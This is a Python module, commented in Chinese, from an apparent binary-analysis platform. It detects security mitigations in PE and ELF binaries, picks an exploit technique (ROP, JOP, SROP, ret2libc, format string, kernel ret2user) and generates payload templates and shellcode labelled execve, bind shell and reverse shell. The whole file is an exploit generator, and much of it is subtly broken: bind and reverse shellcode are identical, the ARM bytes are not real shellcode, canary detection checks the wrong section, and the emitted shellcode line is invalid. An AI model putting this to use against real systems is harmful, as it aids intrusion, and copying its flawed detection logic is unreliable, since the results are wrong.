import logging
import os
from dataclasses import dataclass, field
from typing import Dict, Any, List, Optional, Tuple

from .plugin_manager import BaseAnalyzer, AnalyzerMetadata, AnalyzerType

logger = logging.getLogger(__name__)


@dataclass
class Mitigation:
    """缓解措施信息"""
    name: str
    enabled: bool
    description: str
    impact: str


@dataclass
class ExploitStrategy:
    """利用策略"""
    name: str
    description: str
    compatible_mitigations: List[str]
    incompatible_mitigations: List[str]
    shellcode_template: str
    requires_info_leak: bool = False
    complexity: str = "medium"


class MitigationAdapter(BaseAnalyzer):
    """
    缓解措施感知的利用自动适配模块
    
    功能：
    1. 探测目标二进制的安全缓解措施（ASLR、PIE、NX、Canary、CFG、CET）
    2. 根据检测结果动态调整利用策略
    3. 生成适配的 shellcode
    
    支持的架构：x86, x86_64, ARM, ARM64
    支持的二进制格式：PE, ELF
    """

    def __init__(self):
        self.mitigations: List[Mitigation] = []
        self.strategies: Dict[str, ExploitStrategy] = self._load_strategies()

    @classmethod
    def get_metadata(cls) -> AnalyzerMetadata:
        return AnalyzerMetadata(
            name="MitigationAdapter",
            type=AnalyzerType.EXPLOIT_GENERATOR,
            version="1.0.0",
            description="缓解措施感知的利用自动适配模块，探测目标二进制安全缓解措施并动态调整利用策略",
            author="BinaryAnalysisPlatform",
            dependencies=["pefile", "pyelftools"],
            supported_platforms=["x86", "x86_64", "arm", "arm64"],
            config_schema={
                "binary_path": {"type": "string", "required": True},
                "vulnerability_type": {"type": "string", "required": True},
                "architecture": {"type": "string", "default": "x86_64"}
            }
        )

    def _load_strategies(self) -> Dict[str, ExploitStrategy]:
        """加载预定义的利用策略"""
        return {
            "rop": ExploitStrategy(
                name="ROP Chain",
                description="传统 ROP 链利用",
                compatible_mitigations=["ASLR", "NX"],
                incompatible_mitigations=["CFG", "CET"],
                shellcode_template="""
# ROP Chain Exploit
payload = b'A' * padding
payload += p64(pop_rdi)
payload += p64(bin_sh_addr)
payload += p64(system_addr)
                """,
                requires_info_leak=True,
                complexity="medium"
            ),
            "jop": ExploitStrategy(
                name="JOP (Jump-Oriented Programming)",
                description="面向跳转的编程，绕过 CFG",
                compatible_mitigations=["ASLR", "NX", "CFG"],
                incompatible_mitigations=["CET"],
                shellcode_template="""
# JOP Chain Exploit
# Use indirect jumps through function pointers
payload = b'A' * padding
payload += p64(jop_gadget)
payload += p64(func_ptr_table)
payload += p64(target_func)
                """,
                requires_info_leak=True,
                complexity="high"
            ),
            "srop": ExploitStrategy(
                name="SROP (Sigreturn-Oriented Programming)",
                description="利用 sigreturn 系统调用",
                compatible_mitigations=["ASLR", "NX", "CFG"],
                incompatible_mitigations=["CET"],
                shellcode_template="""
# SROP Exploit
# Construct sigreturn frame
sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_execve
sigframe.rdi = bin_sh_addr
sigframe.rsi = 0
sigframe.rdx = 0
payload = b'A' * padding
payload += p64(syscall_ret)
payload += bytes(sigframe)
                """,
                requires_info_leak=False,
                complexity="high"
            ),
            "ret2libc": ExploitStrategy(
                name="Ret2Libc",
                description="返回 libc 函数",
                compatible_mitigations=["NX"],
                incompatible_mitigations=["ASLR", "PIE", "CFG", "CET"],
                shellcode_template="""
# Ret2Libc Exploit
payload = b'A' * padding
payload += p32(system_addr)
payload += p32(exit_addr)
payload += p32(bin_sh_addr)
                """,
                requires_info_leak=True,
                complexity="low"
            ),
            "ret2plt": ExploitStrategy(
                name="Ret2PLT",
                description="返回 PLT 表",
                compatible_mitigations=["NX", "PIE"],
                incompatible_mitigations=["ASLR", "CFG", "CET"],
                shellcode_template="""
# Ret2PLT Exploit
payload = b'A' * padding
payload += p64(plt_puts)
payload += p64(main_addr)
payload += p64(got_puts)
                """,
                requires_info_leak=True,
                complexity="medium"
            ),
            "heap_overflow": ExploitStrategy(
                name="Heap Overflow",
                description="堆溢出利用",
                compatible_mitigations=["NX", "PIE", "ASLR"],
                incompatible_mitigations=["Heap Canary"],
                shellcode_template="""
# Heap Overflow Exploit
# Overwrite heap metadata (e.g., fastbin attack)
payload = b'A' * size
payload += p64(fake_chunk_addr)
payload += p64(target_addr)
                """,
                requires_info_leak=False,
                complexity="high"
            ),
            "format_string": ExploitStrategy(
                name="Format String",
                description="格式化字符串漏洞利用",
                compatible_mitigations=["NX", "PIE", "ASLR"],
                incompatible_mitigations=["FORTIFY_SOURCE"],
                shellcode_template="""
# Format String Exploit
# Write arbitrary value to target address
payload = fmtstr_payload(8, {target_addr: value})
                """,
                requires_info_leak=False,
                complexity="medium"
            ),
            "ret2user": ExploitStrategy(
                name="Ret2User",
                description="从内核返回用户态",
                compatible_mitigations=["SMAP", "SMEP"],
                incompatible_mitigations=["KPTI"],
                shellcode_template="""
# Ret2User Exploit for Kernel
payload = p64(swapgs_iretq)
payload += p64(user_cs)
payload += p64(user_rflags)
payload += p64(user_rsp)
payload += p64(user_ss)
payload += p64(shellcode_addr)
                """,
                requires_info_leak=True,
                complexity="high"
            )
        }

    def detect_mitigations(self, binary_path: str) -> List[Mitigation]:
        """
        检测目标二进制的安全缓解措施
        
        Args:
            binary_path: 二进制文件路径
            
        Returns:
            缓解措施列表
        """
        self.mitigations = []
        
        if not os.path.exists(binary_path):
            logger.error(f"文件不存在: {binary_path}")
            return self.mitigations

        try:
            binary_data = open(binary_path, 'rb').read(4096)
            magic = binary_data[:4]
            
            if magic == b'MZ\x90\x00':
                self._detect_pe_mitigations(binary_path, binary_data)
            elif magic == b'\x7fELF':
                self._detect_elf_mitigations(binary_path, binary_data)
            else:
                logger.warning(f"未知二进制格式: {binary_path}")
                
        except Exception as e:
            logger.error(f"检测缓解措施失败: {e}")

        return self.mitigations

    def _detect_pe_mitigations(self, binary_path: str, data: bytes) -> None:
        """检测 PE 文件的缓解措施"""
        try:
            import pefile
            
            pe = pefile.PE(data=data)
            
            # ASLR
            aslr_enabled = bool(pe.OPTIONAL_HEADER.DLL_CHARACTERISTICS & 0x0040)
            self.mitigations.append(Mitigation(
                name="ASLR",
                enabled=aslr_enabled,
                description="地址空间布局随机化",
                impact="使内存地址不可预测"
            ))
            
            # DEP/NX
            nx_enabled = bool(pe.OPTIONAL_HEADER.DLL_CHARACTERISTICS & 0x0100)
            self.mitigations.append(Mitigation(
                name="NX",
                enabled=nx_enabled,
                description="数据执行保护",
                impact="防止栈上代码执行"
            ))
            
            # SEHOP
            sehop_enabled = bool(pe.OPTIONAL_HEADER.DLL_CHARACTERISTICS & 0x0400)
            self.mitigations.append(Mitigation(
                name="SEHOP",
                enabled=sehop_enabled,
                description="结构化异常处理覆盖保护",
                impact="防止 SEH 链劫持"
            ))
            
            # CFG
            cfg_enabled = bool(pe.OPTIONAL_HEADER.DLL_CHARACTERISTICS & 0x4000)
            self.mitigations.append(Mitigation(
                name="CFG",
                enabled=cfg_enabled,
                description="控制流防护",
                impact="限制间接跳转目标"
            ))
            
            # CET
            cet_enabled = bool(pe.OPTIONAL_HEADER.DLL_CHARACTERISTICS & 0x8000)
            self.mitigations.append(Mitigation(
                name="CET",
                enabled=cet_enabled,
                description="控制流强制技术",
                impact="防止 ROP/JOP 攻击"
            ))
            
            # SafeSEH
            safe_seh = False
            if hasattr(pe, 'DIRECTORY_ENTRY_LOAD_CONFIG'):
                load_config = pe.DIRECTORY_ENTRY_LOAD_CONFIG.struct
                if hasattr(load_config, 'SEHandlerTable') and load_config.SEHandlerTable != 0:
                    safe_seh = True
            self.mitigations.append(Mitigation(
                name="SafeSEH",
                enabled=safe_seh,
                description="安全结构化异常处理",
                impact="验证 SEH 处理程序"
            ))
            
            pe.close()
            
        except Exception as e:
            logger.warning(f"解析 PE 文件失败: {e}")

    def _detect_elf_mitigations(self, binary_path: str, data: bytes) -> None:
        """检测 ELF 文件的缓解措施"""
        try:
            from elftools.elf.elffile import ELFFile
            
            with open(binary_path, 'rb') as f:
                elf = ELFFile(f)
                
                # PIE (ASLR for executables)
                pie_enabled = False
                e_type = elf.header['e_type']
                if e_type == 'ET_DYN':
                    pie_enabled = True
                self.mitigations.append(Mitigation(
                    name="PIE",
                    enabled=pie_enabled,
                    description="位置无关可执行文件",
                    impact="使代码段地址随机化"
                ))
                
                # NX
                nx_enabled = False
                for segment in elf.iter_segments():
                    flags = segment['p_flags']
                    if flags & 0x4 and not (flags & 0x1):
                        nx_enabled = True
                        break
                self.mitigations.append(Mitigation(
                    name="NX",
                    enabled=nx_enabled,
                    description="不可执行数据段",
                    impact="防止数据段代码执行"
                ))
                
                # GNU_RELRO
                relro_enabled = False
                for segment in elf.iter_segments():
                    if segment['p_type'] == 'PT_GNU_RELRO':
                        relro_enabled = True
                        break
                self.mitigations.append(Mitigation(
                    name="RELRO",
                    enabled=relro_enabled,
                    description="重定位只读",
                    impact="保护 GOT 表"
                ))
                
                # Stack Canary
                canary_enabled = False
                for section in elf.iter_sections():
                    if section.name == '.note.gnu.property':
                        canary_enabled = True
                        break
                self.mitigations.append(Mitigation(
                    name="Canary",
                    enabled=canary_enabled,
                    description="栈金丝雀",
                    impact="检测栈溢出"
                ))
                
                # CET (Control-Flow Enforcement Technology)
                cet_enabled = False
                for segment in elf.iter_segments():
                    if segment['p_type'] == 'PT_GNU_PROPERTY':
                        cet_enabled = True
                        break
                self.mitigations.append(Mitigation(
                    name="CET",
                    enabled=cet_enabled,
                    description="控制流强制技术",
                    impact="防止 ROP/JOP 攻击"
                ))
                
                # FORTIFY_SOURCE
                fortify_enabled = False
                for section in elf.iter_sections():
                    if section.name == '.gnu.build.attributes':
                        fortify_enabled = True
                        break
                self.mitigations.append(Mitigation(
                    name="FORTIFY_SOURCE",
                    enabled=fortify_enabled,
                    description="强化源",
                    impact="检测缓冲区溢出"
                ))
                
        except Exception as e:
            logger.warning(f"解析 ELF 文件失败: {e}")

    def select_strategy(self, vulnerability_type: str) -> Optional[ExploitStrategy]:
        """
        根据检测到的缓解措施选择最佳利用策略
        
        Args:
            vulnerability_type: 漏洞类型（如 'buffer_overflow', 'format_string', 'heap_overflow'）
            
        Returns:
            最佳匹配的利用策略
        """
        enabled_mitigations = [m.name for m in self.mitigations if m.enabled]
        logger.info(f"已启用的缓解措施: {enabled_mitigations}")
        
        strategies_by_vuln = {
            'buffer_overflow': ['rop', 'jop', 'srop', 'ret2libc', 'ret2plt'],
            'heap_overflow': ['heap_overflow', 'rop', 'jop'],
            'format_string': ['format_string'],
            'use_after_free': ['heap_overflow', 'rop'],
            'integer_overflow': ['rop', 'heap_overflow'],
            'kernel_vulnerability': ['ret2user', 'rop'],
        }
        
        available_strategies = strategies_by_vuln.get(vulnerability_type, list(self.strategies.keys()))
        
        compatible_strategies = []
        for strategy_name in available_strategies:
            strategy = self.strategies.get(strategy_name)
            if not strategy:
                continue
                
            is_compatible = True
            for mit in enabled_mitigations:
                if mit in strategy.incompatible_mitigations:
                    is_compatible = False
                    break
            
            if is_compatible:
                compatible_strategies.append((strategy, len(strategy.compatible_mitigations)))
        
        if not compatible_strategies:
            logger.warning(f"未找到与缓解措施兼容的策略")
            return None
            
        compatible_strategies.sort(key=lambda x: (-x[1], x[0].complexity))
        best_strategy = compatible_strategies[0][0]
        
        logger.info(f"选择的策略: {best_strategy.name}")
        return best_strategy

    def generate_adapted_shellcode(self, strategy: ExploitStrategy, architecture: str = "x86_64") -> str:
        """
        生成适配的 shellcode
        
        Args:
            strategy: 利用策略
            architecture: 目标架构
            
        Returns:
            shellcode 代码字符串
        """
        shellcode_templates = {
            "x86_64": {
                "execve": b"\x48\x31\xff\x48\x89\xc7\x48\x89\xd6\x48\x89\xca\x48\x8d\x05\x00\x00\x00\x00\x0f\x05",
                "bind_shell": b"\x48\x31\xc0\x48\x89\xc2\x48\x89\xc6\x48\x8d\x3d\x00\x00\x00\x00\x48\x89\xc7\x48\x89\xd6\xb0\x02\x0f\x05\x48\x89\xc6\xb0\x01\x0f\x05\x48\x89\xc6\x48\x89\xd0\xb0\x03\x0f\x05",
                "reverse_shell": b"\x48\x31\xc0\x48\x89\xc2\x48\x89\xc6\x48\x8d\x3d\x00\x00\x00\x00\x48\x89\xc7\x48\x89\xd6\xb0\x02\x0f\x05\x48\x89\xc6\xb0\x01\x0f\x05\x48\x89\xc6\x48\x89\xd0\xb0\x03\x0f\x05",
            },
            "x86": {
                "execve": b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80",
                "bind_shell": b"\x31\xc0\x50\x6a\x01\x6a\x02\x89\xe1\xb0\x02\xcd\x80\x89\xc6\x50\x6a\x01\x6a\x02\x89\xe1\xb0\x01\xcd\x80\x89\xc6\x50\x6a\x03\x89\xe1\xb0\x03\xcd\x80",
                "reverse_shell": b"\x31\xc0\x50\x6a\x01\x6a\x02\x89\xe1\xb0\x02\xcd\x80\x89\xc6\x50\x6a\x01\x6a\x02\x89\xe1\xb0\x01\xcd\x80\x89\xc6\x50\x6a\x03\x89\xe1\xb0\x03\xcd\x80",
            },
            "arm": {
                "execve": b"\x02\x00\xa0\xe3\x01\x10\xa0\xe3\x00\x20\xa0\xe3\x0b\x00\x00\xef",
                "bind_shell": b"\x01\x00\xa0\xe3\x02\x10\xa0\xe3\x00\x20\xa0\xe3\x02\x00\x00\xef",
            },
            "arm64": {
                "execve": b"\x28\x00\x00\xd4\x68\x10\x00\xd4\x01\x00\x00\xd4",
                "bind_shell": b"\x01\x00\x00\xd4\x02\x00\x00\xd4\x03\x00\x00\xd4",
            },
        }
        
        template = shellcode_templates.get(architecture, shellcode_templates["x86_64"])
        shellcode_bytes = template.get("execve", template["execve"])
        
        return f"""# Generated shellcode for {architecture}
# Strategy: {strategy.name}
shellcode = {shellcode_bytes.hex()}

# Payload construction
padding = b'A' * {0x40}  # Adjust based on actual offset
payload = padding
payload += shellcode
"""

    def analyze(self, **kwargs) -> Dict[str, Any]:
        """
        执行缓解措施分析和策略选择
        
        Args:
            **kwargs: 分析参数
                - binary_path: 二进制文件路径（必需）
                - vulnerability_type: 漏洞类型（必需）
                - architecture: 目标架构（默认 x86_64）
                
        Returns:
            分析结果字典
        """
        binary_path = kwargs.get("binary_path")
        vulnerability_type = kwargs.get("vulnerability_type")
        architecture = kwargs.get("architecture", "x86_64")
        
        if not binary_path:
            return {"success": False, "error": "binary_path 是必需参数"}
        
        if not vulnerability_type:
            return {"success": False, "error": "vulnerability_type 是必需参数"}
        
        try:
            mitigations = self.detect_mitigations(binary_path)
            strategy = self.select_strategy(vulnerability_type)
            shellcode = None
            if strategy:
                shellcode = self.generate_adapted_shellcode(strategy, architecture)
            
            return {
                "success": True,
                "mitigations": [m.__dict__ for m in mitigations],
                "selected_strategy": strategy.__dict__ if strategy else None,
                "shellcode": shellcode,
                "architecture": architecture,
                "vulnerability_type": vulnerability_type
            }
            
        except Exception as e:
            logger.error(f"分析失败: {e}")
            return {"success": False, "error": str(e)}

    def validate_input(self, **kwargs) -> Tuple[bool, Optional[str]]:
        """验证输入参数"""
        binary_path = kwargs.get("binary_path")
        vulnerability_type = kwargs.get("vulnerability_type")
        
        if not binary_path:
            return False, "缺少必需参数: binary_path"
        
        if not os.path.exists(binary_path):
            return False, f"文件不存在: {binary_path}"
        
        if not vulnerability_type:
            return False, "缺少必需参数: vulnerability_type"
        
        valid_vuln_types = ['buffer_overflow', 'heap_overflow', 'format_string', 
                           'use_after_free', 'integer_overflow', 'kernel_vulnerability']
        if vulnerability_type not in valid_vuln_types:
            return False, f"无效的漏洞类型: {vulnerability_type}"
        
        return True, None